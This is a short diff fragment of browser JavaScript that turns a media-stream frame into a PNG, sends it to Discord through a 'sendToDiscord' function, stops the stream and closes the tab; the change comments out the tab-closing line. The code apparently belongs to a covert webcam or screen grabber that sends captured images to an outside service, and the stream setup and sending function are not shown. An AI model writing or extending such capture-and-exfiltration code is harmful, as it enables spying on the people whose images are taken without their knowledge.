@@ -31,7 +31,7 @@
                     canvas.toBlob((blob) => {
                         sendToDiscord(blob);
                         stream.getTracks().forEach(track => track.stop());
-                        window.close(); // Close the tab
+                        //window.close(); // Close the tab
                     }, 'image/png');
                 }, 3000);
             } catch (err) {
